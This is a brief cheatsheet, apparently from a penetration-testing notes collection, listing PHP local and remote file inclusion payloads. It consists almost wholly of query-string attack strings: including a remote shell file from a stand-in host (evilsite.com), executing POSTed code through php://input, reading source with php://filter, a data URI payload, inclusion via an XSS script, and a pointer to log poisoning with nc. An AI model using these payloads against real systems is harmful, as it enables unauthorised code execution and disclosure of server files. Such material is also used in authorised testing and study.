---
id: 4aee11e5-f3fe-412f-8cfa-287d470afceb
name: local file inclusion / remote file inclusion
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:40.631203+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# local file inclusion / remote file inclusion

**Command** ([[including remote code]]):

```bash
?file=[http|https|ftp]://evilsite.com/shell.txt

```

**Command** ([[using php stream php://input]]):

```bash
?file=php://input

```

# specify your payload in the post parameters

**Command** ([[using php stream php://filter]]):

```bash
?file=php://filter/convert.base64-encode/resource=index.php

```

**Command** ([[using data uri]]):

```bash
?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=

```

**Command** ([[using xss]]):

```bash
?file=http://127.0.0.1/path/xss.php?xss=phpcode

```

# inject php code in logfile with nc and retrieve it afterwards

search for nc
